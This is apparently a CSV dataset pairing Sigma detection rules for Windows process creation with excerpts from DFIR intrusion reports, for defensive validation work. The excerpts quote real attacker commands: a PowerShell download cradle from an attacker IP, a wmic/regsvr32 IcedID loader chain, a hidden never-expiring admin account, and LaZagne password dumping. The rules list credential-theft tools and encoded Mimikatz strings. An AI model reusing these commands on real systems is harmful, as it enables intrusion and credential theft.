source_folder,Filename,Excerpts from DFIR Report,LogSource and Detection,HumValidated
folder_04,proc_creation_win_hktl_lazagne.yml,"**Comprehensive Password Dump:** ""LaZagne was used with the '-all' switch to comprehensively extract passwords"" **Command:** ""ls.exe all -oN -output C:\Users\REDACTED"" **Multiple Sources:** ""The tool can dump passwords from Browsers, LSA secrets, System hashes, Keepass, WinSCP, RDP Manager, OpenVPN, Git"" **Admin Privileges:** ""When run with admin privileges, LaZagne attempts to dump credentials from local registry hives""","logsource:
    product: windows
    category: process_creation
detection:
    selection_metadata:
        - Image|endswith: '\lazagne.exe'
        - Hashes|contains:
              - 'IMPHASH=ba5546933531fafa869b1f86a4e2a959'
              - 'IMPHASH=7aa1951517b3b8d38b12f874b66196c9'
              - 'IMPHASH=be10bb45cef8dcc6869b921dd20884ae'
              - 'IMPHASH=4e3e7ce958acceeb80e70eeb7d75870e'
              - 'IMPHASH=fc40519af20116c903e3ff836e366e39'
              - 'IMPHASH=1975641ebd67bc0f49282a7b8555b7b2'
              - 'IMPHASH=468ad8de9dcf3ce7a0becc5916ec6adb'
              - 'IMPHASH=e5d81cf6a49d9472d6de8c1764efdfb4'
              - 'IMPHASH=b87afca7a1175b7eb49b7c1eb6d58adf'
    selection_img_cli:
        Image|contains:
            - ':\PerfLogs\'
            - ':\ProgramData\'
            - ':\Temp\'
            - ':\Tmp\'
            - ':\Users\Public\'
            - ':\Windows\Temp\'
            - '\$Recycle.bin'
            - '\AppData\'
            - '\Desktop\'
            - '\Downloads\'
            - '\Favorites\'
            - '\Links\'
            - '\Music\'
            - '\Photos\'
            - '\Pictures\'
            - '\Saved Games\'
            - '\Searches\'
            - '\Users\Contacts\'
            - '\Users\Default\'
            - '\Users\Searches\'
            - '\Videos\'
            - '\Windows\addins\'
            - '\Windows\Fonts\'
            - '\Windows\IME\'
        CommandLine|endswith:
            - '.exe all'
            - '.exe browsers'
            - '.exe chats'
            - '.exe databases'
            - '.exe games'
            - '.exe git'
            - '.exe mails'
            - '.exe maven'
            - '.exe memory'
            - '.exe multimedia'
            - '.exe sysadmin'
            - '.exe unused'
            - '.exe wifi'
            - '.exe windows'
    selection_cli_modules:
        CommandLine|contains:
            - 'all '
            - 'browsers '
            - 'chats '
            - 'databases '
            - 'games '
            - 'mails '
            - 'maven '
            - 'memory '
            - 'multimedia '
            - 'php '
            - 'svn '
            - 'sysadmin '
            - 'unused '
            - 'wifi '
    selection_cli_options:
        CommandLine|contains:
            - '-1Password'
            - '-apachedirectorystudio'
            - '-autologon'
            - '-ChromiumBased'
            - '-coreftp'
            - '-credfiles'
            - '-credman'
            - '-cyberduck'
            - '-dbvis'
            - '-EyeCon'
            - '-filezilla'
            - '-filezillaserver'
            - '-ftpnavigator'
            - '-galconfusion'
            - '-gitforwindows'
            - '-hashdump'
            - '-iisapppool'
            - '-IISCentralCertP'
            - '-kalypsomedia'
            - '-keepass'
            - '-keepassconfig'
            - '-lsa_secrets'
            - '-mavenrepositories'
            - '-memory_dump'
            - '-Mozilla'
            - '-mRemoteNG'
            - '-mscache'
            - '-opensshforwindows'
            - '-openvpn'
            - '-outlook'
            - '-pidgin'
            - '-postgresql'
            - '-psi-im'
            - '-puttycm'
            - '-pypykatz'
            - '-Rclone'
            - '-rdpmanager'
            - '-robomongo'
            - '-roguestale'
            - '-skype'
            - '-SQLDeveloper'
            - '-squirrel'
            - '-tortoise'
            - '-turba'
            - '-UCBrowser'
            - '-unattended'
            - '-vault'
            - '-vaultfiles'
            - '-vnc'
            - '-winscp'
    condition: selection_metadata or selection_img_cli or all of selection_cli_*",
folder_04,proc_creation_win_hktl_powertool.yml,"**Process and Driver Termination:** ""PowerTool which has the ability to kill a process, delete its process file, unload drivers, and delete the driver files"" **Defense Evasion:** Used to disable security tools and remove their files from the system","logsource:
    product: windows
    category: process_creation
detection:
    selection:
        - Image|endswith:
              - '\PowerTool.exe'
              - '\PowerTool64.exe'
        - OriginalFileName: 'PowerTool.exe'
    condition: selection",
folder_04,proc_creation_win_imagingdevices_unusual_parents.yml,"**Bumblebee Activity:** ""Detects unusual parent or children of the ImagingDevices.exe (Windows Contacts) process as seen being used with Bumblebee activity"" **Process Injection:** Used as an injection target by Bumblebee malware **Unusual Parents:** Suspicious when spawned by WmiPrvSE.exe, svchost.exe, or dllhost.exe","logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - \WmiPrvSE.exe
            - \svchost.exe
            - \dllhost.exe
        Image|endswith: '\ImagingDevices.exe'
    selection_child:
        ParentImage|endswith: '\ImagingDevices.exe'
    condition: 1 of selection_*",
folder_04,proc_creation_win_lolbins_by_office_applications.yml,"**Macro Execution:** ""Initial execution of the document writes a file to: C:\Users\Public\microsoft.security"" **LOLBin Usage:** ""wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'"" **Office Spawning:** regsvr32 being used as a LOLBin after an Office document macro execution","logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '\regsvr32.exe'
            - '\rundll32.exe'
            - '\msiexec.exe'
            - '\mshta.exe'
            - '\verclsid.exe'
            - '\msdt.exe'
            - '\control.exe'
            - '\msidb.exe'
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\msaccess.exe'
            - '\mspub.exe'
            - '\eqnedt32.exe'
            - '\visio.exe'
            - '\wordpad.exe'
            - '\wordview.exe'
    condition: selection",
folder_04,proc_creation_win_malware_icedid_rundll32_dllregisterserver.yml,"**Single Digit DLL:** ""rundll32.exe c:\windows\temp\1.dll, DllRegisterServer"" **IcedID Pattern:** ""The rundll32.exe was first copied to %temp%\entails.exe"" **DllRegisterServer Export:** ""The malicious DLL (templates544.png) was executed with a randomized filename"" **Evasion Technique:** ""This was likely to evade detection logic based around command line execution""","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        Image|endswith: '\rundll32.exe'
        CommandLine|endswith:
            - '\1.dll, DllRegisterServer'
            - ' 1.dll, DllRegisterServer'
    condition: selection",
folder_04,proc_creation_win_mofcomp_execution.yml,"**MOF Script Installation:** ""Attackers abuse this utility to install malicious MOF scripts"" **WMI Repository:** ""The mofcomp utility parses a file containing MOF statements and adds the classes and class instances defined in the file to the WMI repository"" **Suspicious Paths:** CommandLine contains suspicious paths like AppData\Local\Temp, Users\Public, WINDOWS\Temp","logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith: '\mofcomp.exe'
        - OriginalFileName: 'mofcomp.exe'
    selection_case:
        - ParentImage|endswith:
              - '\cmd.exe'
              - '\powershell.exe'
              - '\pwsh.exe'
              - '\wsl.exe'
              - '\wscript.exe'
              - '\cscript.exe'
        - CommandLine|contains:
              - '\AppData\Local\Temp'
              - '\Users\Public\'
              - '\WINDOWS\Temp\'
              - '%temp%'
              - '%tmp%'
              - '%appdata%'
    filter_main_wmiprvse:
        ParentImage: 'C:\Windows\System32\wbem\WmiPrvSE.exe'
        CommandLine|contains: 'C:\Windows\TEMP\'
        CommandLine|endswith: '.mof'
    filter_optional_null_parent:
        CommandLine|contains: 'C:\Windows\TEMP\'
        CommandLine|endswith: '.mof'
    condition: all of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*",
folder_04,proc_creation_win_net_groups_and_accounts_recon.yml,"**Domain Group Discovery:** ""net group 'Domain admins' /DOMAIN"" **Enterprise Admins:** ""net group 'enterprise admins' /domain"" **Administrator Account:** ""net user administrator /domain"" **Lateral Movement:** Used for reconnaissance before lateral movement and privilege escalation","logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith:
              - '\net.exe'
              - '\net1.exe'
        - OriginalFileName:
              - 'net.exe'
              - 'net1.exe'
    selection_group_root:
        CommandLine|contains:
            - ' group '
            - ' localgroup '
    selection_group_flags:
        CommandLine|contains:
            - 'domain admins'
            - ' administrator'
            - ' administrateur'
            - 'enterprise admins'
            - 'Exchange Trusted Subsystem'
            - 'Remote Desktop Users'
            - 'Utilisateurs du Bureau à distance'
            - 'Usuarios de escritorio remoto'
            - ' /do'
    filter_group_add:
        CommandLine|contains: ' /add'
    selection_accounts_root:
        CommandLine|contains: ' accounts '
    selection_accounts_flags:
        CommandLine|contains: ' /do'
    condition: selection_img and ((all of selection_group_* and not filter_group_add) or all of selection_accounts_*)",
folder_05,proc_creation_win_net_user_add_never_expire.yml,"Command Used: NET USER Adminv$ !67hCS14ORVg /ADD /expires:never. Specific techniques observed include creating a new local user account, setting account to never expire, adding the new user to local administrators group, and hiding the user account via registry. Detection indicators include watching for NET USER commands with /expires:never flag, monitoring for new users added to Administrators group, and checking registry key HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist.","logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith:
              - '\net.exe'
              - '\net1.exe'
        - OriginalFileName:
              - 'net.exe'
              - 'net1.exe'
    selection_cli:
        CommandLine|contains|all:
            - 'user'
            - 'add'
            - 'expires:never'
    condition: all of selection_*",
folder_05,proc_creation_win_nltest_recon.yml,"Attackers used nltest commands for domain reconnaissance and trust discovery: nltest /domain_trusts /all_trusts and nltest /dclist:DOMAIN. Commands were part of discovery phase to map domain trusts, list domain controllers, and gather network environment information. Also observed: nltest /domain_trusts executed from injected svchost.exe process and later from Cobalt Strike beacons, indicating systematic approach to network reconnaissance.","logsource:
    category: process_creation
    product: windows
detection:
    selection_nltest:
        - Image|endswith: '\nltest.exe'
        - OriginalFileName: 'nltestrk.exe'
    selection_recon:
        - CommandLine|contains|all:
              - 'server'
              - 'query'
        - CommandLine|contains:
              - '/user'
              - 'all_trusts'
              - 'dclist:'
              - 'dnsgetdc:'
              - 'domain_trusts'
              - 'dsgetdc:'
              - 'parentdomain'
              - 'trusted_domains'
    condition: all of selection_*",
folder_05,proc_creation_win_notepad_local_passwd_discovery.yml,"Two specific instances of password file discovery using Notepad: 1) After running Mimikatz, threat actor opened the newly generated password file in Notepad, 2) On a file share server, threat actor discovered a txt file that contained IT-related cleartext passwords and proceeded with opening the txt file using Notepad. These actions were captured in Sysmon event logs, specifically event code 1 showing Notepad process execution.","logsource:
    product: windows
    category: process_creation
detection:
    selection:
        ParentImage|endswith: '\explorer.exe'
        Image|endswith: '\notepad.exe'
        CommandLine|endswith:
            - 'password*.txt'
            - 'password*.csv'
            - 'password*.doc'
            - 'password*.xls'
    condition: selection",
folder_05,proc_creation_win_nslookup_domain_discovery.yml,"Qbot malware performed network reconnaissance using the command: nslookup -querytype=ALL -timeout=10 _ldap._tcp.dc._msdcs.REDACTED. This specific query is typically used to discover domain controllers in a Windows Active Directory environment. The command attempts to locate LDAP services associated with domain controllers, which helps the attacker map the network's domain infrastructure as part of Qbot's broader discovery phase.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains|all:
            - 'nslookup'
            - '_ldap._tcp.dc._msdcs.'
    condition: selection",
folder_05,proc_creation_win_office_from_proxy_executing_regsvr32_payload.yml,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,"logsource:
    product: windows
    category: process_creation
detection:
    selection_img:
        - Image|endswith: '\wbem\WMIC.exe'
        - OriginalFileName: 'wmic.exe'
    selection_other:
        CommandLine|contains:
            - 'regsvr32'
            - 'rundll32'
            - 'msiexec'
            - 'mshta'
            - 'verclsid'
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
        CommandLine|contains|all:
            - 'process'
            - 'create'
            - 'call'
    condition: all of selection_*",
folder_05,proc_creation_win_office_from_proxy_executing_regsvr32_payload2.yml,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,"logsource:
    product: windows
    category: process_creation
detection:
    selection1:
        CommandLine|contains:
            - 'regsvr32'
            - 'rundll32'
            - 'msiexec'
            - 'mshta'
            - 'verclsid'
    selection2:
        - Image|endswith: '\wbem\WMIC.exe'
        - CommandLine|contains: 'wmic '
    selection3:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
    selection4:
        CommandLine|contains|all:
            - 'process'
            - 'create'
            - 'call'
    condition: all of selection*",
folder_05,proc_creation_win_office_spawning_wmi_commandline.yml,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,"logsource:
    product: windows
    category: process_creation
detection:
    selection1:
        - Image|endswith: '\wbem\WMIC.exe'
        - CommandLine|contains: 'wmic '
    selection2:
        ParentImage|endswith:
            - '\winword.exe'
            - '\excel.exe'
            - '\powerpnt.exe'
            - '\msaccess.exe'
            - '\mspub.exe'
            - '\eqnedt32.exe'
            - '\visio.exe'
    condition: all of selection*",
folder_05,proc_creation_win_office_susp_child_processes.yml,Initial execution involved an xlsm document that used a macro to initiate a wmic command and executed a file via regsvr32 from a remote executable disguised as a GIF image. Specific execution: wmic.exe process call create 'regsvr32 -s C:\Users\Public\microsoft.security'. Downloaded file from http://vpu03jivmm03qncgx.com/index.gif where the GIF was actually the IcedID malware. The execution method leveraged Office application (Excel) to spawn a suspicious child process through wmic and regsvr32.,"logsource:
    category: process_creation
    product: windows
detection:
    selection_parent:
        ParentImage|endswith:
            - '\EQNEDT32.EXE'
            - '\EXCEL.EXE'
            - '\MSACCESS.EXE'
            - '\MSPUB.exe'
            - '\ONENOTE.EXE'
            - '\POWERPNT.exe'
            - '\VISIO.exe'
            - '\WINWORD.EXE'
            - '\wordpad.exe'
            - '\wordview.exe'
    selection_child_processes:
        - OriginalFileName:
              - 'bitsadmin.exe'
              - 'CertOC.exe'
              - 'CertUtil.exe'
              - 'Cmd.Exe'
              - 'CMSTP.EXE'
              - 'cscript.exe'
              - 'curl.exe'
              - 'HH.exe'
              - 'IEExec.exe'
              - 'InstallUtil.exe'
              - 'javaw.exe'
              - 'Microsoft.Workflow.Compiler.exe'
              - 'msdt.exe'
              - 'MSHTA.EXE'
              - 'msiexec.exe'
              - 'Msxsl.exe'
              - 'odbcconf.exe'
              - 'pcalua.exe'
              - 'PowerShell.EXE'
              - 'RegAsm.exe'
              - 'RegSvcs.exe'
              - 'REGSVR32.exe'
              - 'RUNDLL32.exe'
              - 'schtasks.exe'
              - 'ScriptRunner.exe'
              - 'wmic.exe'
              - 'WorkFolders.exe'
              - 'wscript.exe'
        - Image|endswith:
              - '\AppVLP.exe'
              - '\bash.exe'
              - '\bitsadmin.exe'
              - '\certoc.exe'
              - '\certutil.exe'
              - '\cmd.exe'
              - '\cmstp.exe'
              - '\control.exe'
              - '\cscript.exe'
              - '\curl.exe'
              - '\forfiles.exe'
              - '\hh.exe'
              - '\ieexec.exe'
              - '\installutil.exe'
              - '\javaw.exe'
              - '\mftrace.exe'
              - '\Microsoft.Workflow.Compiler.exe'
              - '\msbuild.exe'
              - '\msdt.exe'
              - '\mshta.exe'
              - '\msidb.exe'
              - '\msiexec.exe'
              - '\msxsl.exe'
              - '\odbcconf.exe'
              - '\pcalua.exe'
              - '\powershell.exe'
              - '\pwsh.exe'
              - '\regasm.exe'
              - '\regsvcs.exe'
              - '\regsvr32.exe'
              - '\rundll32.exe'
              - '\schtasks.exe'
              - '\scrcons.exe'
              - '\scriptrunner.exe'
              - '\sh.exe'
              - '\svchost.exe'
              - '\verclsid.exe'
              - '\wmic.exe'
              - '\workfolders.exe'
              - '\wscript.exe'
    selection_child_susp_paths:
        Image|contains:
            - '\AppData\'
            - '\Users\Public\'
            - '\ProgramData\'
            - '\Windows\Tasks\'
            - '\Windows\Temp\'
            - '\Windows\System32\Tasks\'
    condition: selection_parent and 1 of selection_child_*",
folder_05,proc_creation_win_powershell_base64_invoke_susp_cmdlets.yml,"Multiple layers of encoding were used including hexadecimal, XOR, base64, and gunzip decoding. Encoded commands often invoked Mimikatz credential extraction, LaZagne password dumping, remote execution via WMIExec, and SharpHound Active Directory discovery. A representative encoded command used XOR and Base64, which when decoded revealed Invoke-Mimikatz. Used complex decoding methods and often used -nop -w hidden -c PowerShell flags to hide execution while frequently downloading and executing remote scripts.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'SQBuAHYAbwBrAGUALQBCAGwAbwBvAGQASABvAHUAbgBkA'
            - 'kAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZA'
            - 'JAG4AdgBvAGsAZQAtAEIAbABvAG8AZABIAG8AdQBuAGQA'
            - 'SQBuAHYAbwBrAGUALQBNAGkAbQBpAGsAYQB0AHoA'
            - 'kAbgB2AG8AawBlAC0ATQBpAG0AaQBrAGEAdAB6A'
            - 'JAG4AdgBvAGsAZQAtAE0AaQBtAGkAawBhAHQAeg'
            - 'SQBuAHYAbwBrAGUALQBXAE0ASQBFAHgAZQBjA'
            - 'kAbgB2AG8AawBlAC0AVwBNAEkARQB4AGUAYw'
            - 'JAG4AdgBvAGsAZQAtAFcATQBJAEUAeABlAGMA'
    condition: selection",
folder_05,proc_creation_win_powershell_base64_invoke.yml,"Multiple layers of encoding were used including hexadecimal, XOR, base64, and gunzip decoding. Encoded commands often invoked Mimikatz credential extraction, LaZagne password dumping, remote execution via WMIExec, and SharpHound Active Directory discovery. A representative encoded command used XOR and Base64, which when decoded revealed Invoke-Mimikatz. Used complex decoding methods and often used -nop -w hidden -c PowerShell flags to hide execution while frequently downloading and executing remote scripts.","logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|endswith:
              - '\powershell.exe'
              - '\pwsh.exe'
        - OriginalFileName:
              - 'PowerShell.EXE'
              - 'pwsh.dll'
    selection_cli_enc:
        CommandLine|contains: ' -e'
    selection_cli_invoke:
        CommandLine|contains:
            - 'SQBuAHYAbwBrAGUALQ'
            - 'kAbgB2AG8AawBlAC0A'
            - 'JAG4AdgBvAGsAZQAtA'
            - 'SW52b2tlL'
            - 'ludm9rZS'
            - 'JbnZva2Ut'
    condition: all of selection_*",
folder_06,proc_creation_win_powershell_base64_reflection_assembly_load_obfusc.yml,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'OgA6ACgAIgBMACIAKwAiAG8AYQBkACIAKQ'
            - 'oAOgAoACIATAAiACsAIgBvAGEAZAAiACkA'
            - '6ADoAKAAiAEwAIgArACIAbwBhAGQAIgApA'
            - 'OgA6ACgAIgBMAG8AIgArACIAYQBkACIAKQ'
            - 'oAOgAoACIATABvACIAKwAiAGEAZAAiACkA'
            - '6ADoAKAAiAEwAbwAiACsAIgBhAGQAIgApA'
            - 'OgA6ACgAIgBMAG8AYQAiACsAIgBkACIAKQ'
            - 'oAOgAoACIATABvAGEAIgArACIAZAAiACkA'
            - '6ADoAKAAiAEwAbwBhACIAKwAiAGQAIgApA'
            - 'OgA6ACgAJwBMACcAKwAnAG8AYQBkACcAKQ'
            - 'oAOgAoACcATAAnACsAJwBvAGEAZAAnACkA'
            - '6ADoAKAAnAEwAJwArACcAbwBhAGQAJwApA'
            - 'OgA6ACgAJwBMAG8AJwArACcAYQBkACcAKQ'
            - 'oAOgAoACcATABvACcAKwAnAGEAZAAnACkA'
            - '6ADoAKAAnAEwAbwAnACsAJwBhAGQAJwApA'
            - 'OgA6ACgAJwBMAG8AYQAnACsAJwBkACcAKQ'
            - 'oAOgAoACcATABvAGEAJwArACcAZAAnACkA'
            - '6ADoAKAAnAEwAbwBhACcAKwAnAGQAJwApA'
    condition: selection",
folder_06,proc_creation_win_powershell_base64_reflection_assembly_load.yml,"Used custom letter-to-hex encoding scheme with unique mappings where letters correspond to hex characters. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. Assembly loading pattern used [reflection.assembly]::Load() method to load encoded payload, decoded payload dynamically using mathematical transformations, and extracted payload from registry keys. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
            - 'AFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiAC'
            - 'BbAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgAp'
            - 'AWwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAK'
            - 'WwBSAGUAZgBsAGUAYwB0AGkAbwBuAC4AQQBzAHMAZQBtAGIAbAB5AF0AOgA6ACgAIgBMAG8AYQBkACIAKQ'
            - 'sAUgBlAGYAbABlAGMAdABpAG8AbgAuAEEAcwBzAGUAbQBiAGwAeQBdADoAOgAoACIATABvAGEAZAAiACkA'
            - 'bAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAG0AYgBsAHkAXQA6ADoAKAAiAEwAbwBhAGQAIgApA'
            - 'WwByAGUAZgBsAGUAYwB0AGkAbwBuAC4AYQBzAHMAZQBtAGIAbAB5AF0AOgA6AEwAbwBhAGQAKA'
            - 'sAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBMAG8AYQBkACgA'
            - 'bAHIAZQBmAGwAZQBjAHQAaQBvAG4ALgBhAHMAcwBlAG0AYgBsAHkAXQA6ADoATABvAGEAZAAoA'
    condition: selection",
folder_06,proc_creation_win_powershell_download_cradle_obfuscated.yml,"Example obfuscated download cradle: powershell -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('hxxp://37.120.198.225:80/trio')). Used custom letter-to-hex encoding scheme with unique mappings. Multi-layer encoding included first layer with hexadecimal and XOR encoding, second layer with base64 encoded gzip-compressed data. The technique demonstrated sophisticated obfuscation to evade detection while loading malicious assemblies in memory.","logsource:
    product: windows
    category: process_creation
detection:
    selection:
        Image|endswith: '\powershell.exe'
        CommandLine|contains|all:
            - 'http://127.0.0.1'
            - '%{(IRM $_)}'
            - 'Invoke'
    condition: selection",
folder_06,proc_creation_win_powershell_set_policies_to_unsecure_level.yml,No specific information found about PowerShell execution policy changes or bypasses in the referenced DFIR report. The document mentions PowerShell script agent1.ps1 with obfuscated code and a command powershell.exe -c Reset-ComputerMachinePassword but does not provide details about execution policy modifications.,"logsource:
    product: windows
    category: process_creation
detection:
    selection_img:
        - OriginalFileName:
              - 'PowerShell.EXE'
              - 'pwsh.dll'
        - Image|endswith:
              - '\powershell.exe'
              - '\pwsh.exe'
    selection_option:
        CommandLine|contains:
            - '-executionpolicy '
            - ' -ep '
            - ' -exec '
    selection_level:
        CommandLine|contains:
            - 'Bypass'
            - 'Unrestricted'
    condition: all of selection_*",
folder_06,proc_creation_win_pua_adfind_susp_usage.yml,"AdFind is a command line Active Directory query tool used for gathering network information. Threat actors use it to collect details about person objects, computer systems, domain trusts, subnets, and domain controllers. Observed commands include: adfind.exe -gcb -sc trustdmp, adfind.exe -f (objectcategory=group), adfind.exe -subnets -f (objectCategory=subnet), adfind.exe -f (objectcategory=organizationalUnit), adfind.exe -f objectcategory=computer, adfind.exe -f (objectcategory=person). These commands are part of reconnaissance efforts to map domain structure, trust relationships, and user/computer assets.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        CommandLine|contains:
            - 'domainlist'
            - 'trustdmp'
            - 'dcmodes'
            - 'adinfo'
            - ' dclist '
            - 'computer_pwdnotreqd'
            - 'objectcategory='
            - '-subnets -f'
            - 'name=""Domain Admins""'
            - '-sc u:'
            - 'domainncs'
            - 'dompol'
            - ' oudmp '
            - 'subnetdmp'
            - 'gpodmp'
            - 'fspdmp'
            - 'users_noexpire'
            - 'computers_active'
            - 'computers_pwdnotreqd'
    condition: selection",
folder_06,proc_creation_win_pua_advanced_ip_scanner.yml,"Advanced IP Scanner was used to scan the network environment as part of the threat actor's Discovery phase of the intrusion. The scanning was likely done to map out potential target systems for lateral movement, which the threat actor subsequently performed using RDP to access multiple machines in the environment.","logsource:
    category: process_creation
    product: windows
detection:
    selection_img:
        - Image|contains: '\advanced_ip_scanner'
        - OriginalFileName|contains: 'advanced_ip_scanner'
        - Description|contains: 'Advanced IP Scanner'
    selection_cli:
        CommandLine|contains|all:
            - '/portable'
            - '/lng'
    condition: 1 of selection_*",
folder_06,proc_creation_win_pua_ditsnap.yml,"Ditsnap was most likely run on the DC to obtain a copy of ntds.dit by creating a snapshot. This suggests the attackers used ditsnap as a technique to access credential information stored in the Active Directory database, which could be used for further lateral movement or privilege escalation during the Snatch ransomware intrusion.","logsource:
    category: process_creation
    product: windows
detection:
    selection:
        - Image|endswith: '\ditsnap.exe'
        - CommandLine|contains: 'ditsnap.exe'
    condition: selection",
